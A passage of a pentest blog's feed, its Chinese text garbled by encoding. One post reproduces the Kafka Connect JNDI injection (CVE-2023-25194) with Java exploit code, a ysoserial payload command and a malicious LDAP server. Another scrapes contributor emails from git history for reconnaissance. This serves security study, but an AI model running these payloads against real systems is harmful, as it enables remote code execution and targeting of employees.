href="https://nelson.cloud/scrape-contributor-emails-from-any-git-repository/">Scrape Contributor Emails From Any Git Repository</a></li><li><a href="https://mp.weixin.qq.com/s/zoYE102P_2BvB-sForjkHQ">githubå°æŠ€å·§</a></li><li><a href="https://www.securitronlinux.com/debian-testing/how-to-get-a-listing-of-all-email-addresses-associated-with-a-github-repo/">How To Get A Listing Of All Email Addresses Associated With A Github Repo.</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;è·å–äº†ä¸€ä¸ªå¤šäººè¿åŠ¨çš„gitä»“åº“ï¼Œéœ€è¦æå–ä»“åº“é‡Œé¢æ‰€æœ‰çš„Emailï¼Œç„¶åæ ¹æ®Emailæœä¸€ä¸‹Githubæ˜¯å¦å­˜åœ¨å¯¹åº”çš„æäº¤è®°å½•ã€‚è¿™æ˜¯ä¸€ä¸ªå¾ˆå¸¸è§çš„é—®é¢˜ï¼Œæ¯”å¦‚å…¬å¸å‘˜å·¥åœ¨æäº¤gihtubçš„æ—¶å€™ï¼Œæ²¡æœ‰æ³¨æ„ä¿®æ”¹æäº¤çš„é‚®ç®±ï¼Œå¾ˆå¯èƒ½ä½¿ç”¨å…¬å¸çš„é‚®ç®±è¿›è¡Œæäº¤ã€‚&lt;/p&gt;
&lt;h2 id=&quot;è§£å†³æ–¹å¼&quot;&gt;&lt;a href=&quot;#è§£å†³æ–¹å¼&quot; class=&quot;headerlink&quot; title=&quot;è§£å†³æ–¹å¼&quot;&gt;&lt;/a&gt;è§£å†³æ–¹å¼&lt;/h2&gt;&lt;p&gt;æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥æå–ä¸€ä¸ªä»“åº“çš„æ‰€æœ‰é‚®ç®±ï¼š&lt;/p&gt;
&lt;h3 id=&quot;ç¬¬ä¸€ç§&quot;&gt;&lt;a href=&quot;#ç¬¬ä¸€ç§&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬ä¸€ç§&quot;&gt;&lt;/a&gt;ç¬¬ä¸€ç§&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; log &lt;span class=&quot;token string&quot;&gt;&quot;--format=format:%ae&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;uniq&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;ç¬¬äºŒç§&quot;&gt;&lt;a href=&quot;#ç¬¬äºŒç§&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬äºŒç§&quot;&gt;&lt;/a&gt;ç¬¬äºŒç§&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; shortlog -sea &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;grep&lt;/span&gt; -E -o &lt;span class=&quot;token string&quot;&gt;&quot;&lt;span class=&quot;token entity&quot; title=&quot;\b&quot;&gt;\b&lt;/span&gt;[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&amp;#123;2,6&amp;#125;&lt;span class=&quot;token entity&quot; title=&quot;\b&quot;&gt;\b&lt;/span&gt;&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;&amp;#123;print tolower($0)&amp;#125;&#39;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;uniq&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;grep&lt;/span&gt; -wv &lt;span class=&quot;token string&quot;&gt;&#39;users.noreply.github.com&#39;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç„¶åæ ¹æ®&lt;a href=&quot;https://mp.weixin.qq.com/s/zoYE102P_2BvB-sForjkHQ&quot;&gt;githubå°æŠ€å·§&lt;/a&gt;å†™ä¸€ä¸ªæ‰¹é‡è·å–é‚®ç®±çš„è„šæœ¬ï¼š&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-python&quot; data-language=&quot;python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# coding: utf-8&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; requests
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; json
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; random &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; choice
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; sys
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; time

TOKEN_LISTS &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
      &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;search_commits&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;token&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; email&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
       headers &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;application/vnd.github+json&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
                   &lt;span class=&quot;token string&quot;&gt;&quot;Authorization&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string-interpolation&quot;&gt;&lt;span class=&quot;token string&quot;&gt;f&quot;Bearer &lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;token&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;
                  &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
       req &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; requests&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;get&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;http://api.github.com/search/commits&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;q&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string-interpolation&quot;&gt;&lt;span class=&quot;token string&quot;&gt;f&quot;committer-email:&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;email&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
           headers&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;headers&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
       &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; json&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;loads&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;req&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; __name__ &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;# file = sys.argv[1]&lt;/span&gt;
    &lt;span class=&quot;token builtin&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;/tmp/email.txt&quot;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;as&lt;/span&gt; f&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; line &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;readlines&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
                email &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; line&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;strip&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
                token &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; choice&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;TOKEN_LISTS&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
                
                &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
                    time&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sleep&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
                    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; search_commits&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;token&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; email&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;get&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;total_count&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
                        &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;email&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;token keyword&quot;&gt;except&lt;/span&gt; Exception &lt;span class=&quot;token keyword&quot;&gt;as&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
                     &lt;span class=&quot;token keyword&quot;&gt;raise&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Apache Kafka Connect JNDIæ³¨å…¥æ¼æ´å¤ç°(CVE-2023-25194)</title>
    <link href="https://jkme.github.io/2023/02/14/kafka-rce.html"/>
    <id>https://jkme.github.io/2023/02/14/kafka-rce.html</id>
    <published>2023-02-13T16:00:00.000Z</published>
    <updated>2023-02-22T08:44:47.705Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h2><ul><li>å½±å“ç‰ˆæœ¬ï¼š2.3.0 &lt;= Apache Kafka Connect &lt;= 3.3.2</li><li>ä¿®å¤å»ºè®®: å‡çº§è‡³3.4.0ç‰ˆæœ¬</li><li>å®˜æ–¹é“¾æ¥ï¼š<a href="https://kafka.apache.org/cve-list">https://kafka.apache.org/cve-list</a></li></ul><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æœ¬åœ°å…ˆå¯åŠ¨kafka server:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://dlcdn.apache.org/kafka/3.4.0/kafka_2.13-3.4.0.tgz<span class="token function">tar</span> -xvf kafka_2.13-3.4.0.tgz //å¯åŠ¨zkå’Œkafkabin/zookeeper-server-start.sh config/zookeeper.propertiesbin/kafka-server-start.sh config/server.properties //åˆ›å»ºä¸€ä¸ªæµ‹è¯•topicbin/kafka-topics.sh --create --bootstrap-server localhost:9092 --replication-factor <span class="token number">1</span> --partitions <span class="token number">1</span> --topic <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æµ‹è¯•ä»£ç "><a href="#æµ‹è¯•ä»£ç " class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">KafkaProducer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">Producer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">ProducerRecord</span><span class="token punctuation">;</span> <span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Properties</span> props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sasl.mechanism"</span><span class="token punctuation">,</span> <span class="token string">"SCRAM-SHA-256"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"security.protocol"</span><span class="token punctuation">,</span> <span class="token string">"SASL_SSL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sasl.jaas.config"</span><span class="token punctuation">,</span><span class="token string">"com.sun.security.auth.module.JndiLoginModule "</span>                    <span class="token operator">+</span> <span class="token string">"required user.provider.url=\"ldap://0.0.0.0:1389/Exploit\" "</span>                    <span class="token operator">+</span> <span class="token string">"useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" "</span>                    <span class="token operator">+</span> <span class="token string">"group.provider.url=\"xxx\";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"0.0.0.0:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Producer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaProducer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>            producer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pom.xmlæ–‡ä»¶ï¼š</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.kafka<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>kafka-clients<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.8.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç”Ÿæˆååºåˆ—åŒ–æ•°æ®"><a href="#ç”Ÿæˆååºåˆ—åŒ–æ•°æ®" class="headerlink" title="ç”Ÿæˆååºåˆ—åŒ–æ•°æ®"></a>ç”Ÿæˆååºåˆ—åŒ–æ•°æ®</h3><p><code>java -jar ysuserial-1.3-su18-all.jar -g CommonsBeanutils1183NOCC -p &#39;open -a Calculator.app&#39; |base64|pbcopy</code></p><h3 id="LDAPæ‰˜ç®¡æ•°æ®"><a href="#LDAPæ‰˜ç®¡æ•°æ®" class="headerlink" title="LDAPæ‰˜ç®¡æ•°æ®"></a>LDAPæ‰˜ç®¡æ•°æ®</h3><p>ä½¿ç”¨<a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo">æ¶æ„LDAP</a>ä¿®æ”¹ä¸Šä¸€æ­¥ç”Ÿæˆçš„æ•°æ®ï¼Œç„¶åå¯åŠ¨ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -cp HackerRMIRefServer-all.jar HackerLDAPRefServer  <span class="token number">0.0</span>.0.0 <span class="token number">8088</span> <span class="token number">1389</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿è¡Œä»£ç ï¼Œç„¶åè®¡ç®—å™¨å°±å¼¹å‡ºæ¥äº†</p><h2 id="æµ‹è¯•ä¸­çš„é—®é¢˜"><a href="#æµ‹è¯•ä¸­çš„é—®é¢˜" class="headerlink" title="æµ‹è¯•ä¸­çš„é—®é¢˜"></a>æµ‹è¯•ä¸­çš„é—®é¢˜</h2><p>åœ¨ååºåˆ—åŒ–çš„æµ‹è¯•ä¸­ï¼Œå°è¯•äº†è¿™å‡ ç§jndiæ¡†æ¶ï¼Œåªæœ‰ç¬¬äºŒç§å¯ä»¥æ‰§è¡Œå…¶ä¸­å‘½ä»¤ï¼Œä½†æ˜¯è¿˜ä¸å¤Ÿå®Œç¾ï¼Œæœ€åè¿˜æ˜¯ç”¨su18å¸ˆå‚…çš„<a href="https://github.com/su18/ysoserial">su18/ysoserial</a>ç”Ÿæˆä¹‹åç”¨ldapæ‰˜ç®¡é è°±ã€‚</p><ul><li><a href="https://github.com/Bl0omZ/JNDIEXP">https://github.com/Bl0omZ/JNDIEXP</a></li><li><a href="https://github.com/nu1r/JNDIExploit">https://github.com/nu1r/JNDIExploit</a></li><li><a href="https://github.com/wyzxxz/jndi_tool">https://github.com/wyzxxz/jndi_tool</a></li></ul><p>è€ƒè™‘åˆ°ä¸€ç§é»‘ç›’çš„æƒ…å½¢ï¼Œå‡å¦‚åœ¨ä½¿ç”¨urldnså‘ç°å­˜åœ¨cbé“¾ï¼Œæ”»å‡»çš„æ—¶å€™å¯ä»¥ç”¨ysoserialç”Ÿæˆä¸åŒçš„payloadå¤šå°è¯•å‡ æ¬¡ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;æ¼æ´æè¿°&quot;&gt;&lt;a href=&quot;#æ¼æ´æè¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´æè¿°&quot;&gt;&lt;/a&gt;æ¼æ´æè¿°&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;å½±å“ç‰ˆæœ¬ï¼š2.3.0 &amp;lt;= Apache Kafka Connect &amp;lt;= 3.3.2&lt;/li&gt;
&lt;li&gt;ä¿®å¤å»ºè®®: å‡çº§è‡³3.4.0ç‰ˆæœ¬&lt;/li&gt;
&lt;li&gt;å®˜æ–¹é“¾æ¥ï¼š&lt;a href=&quot;https://kafka.apache.org/cve-list&quot;&gt;https://kafka.apache.org/cve-list&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;æ¼æ´å¤ç°&quot;&gt;&lt;a href=&quot;#æ¼æ´å¤ç°&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´å¤ç°&quot;&gt;&lt;/a&gt;æ¼æ´å¤ç°&lt;/h2&gt;&lt;p&gt;æœ¬åœ°å…ˆå¯åŠ¨kafka server:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;wget&lt;/span&gt; https://dlcdn.apache.org/kafka/3.4.0/kafka_2.13-3.4.0.tgz
&lt;span class=&quot;token function&quot;&gt;tar&lt;/span&gt; -xvf kafka_2.13-3.4.0.tgz
 
//å¯åŠ¨zkå’Œkafka
bin/zookeeper-server-start.sh config/zookeeper.properties
bin/kafka-server-start.sh config/server.properties
 
//åˆ›å»ºä¸€ä¸ªæµ‹è¯•topic
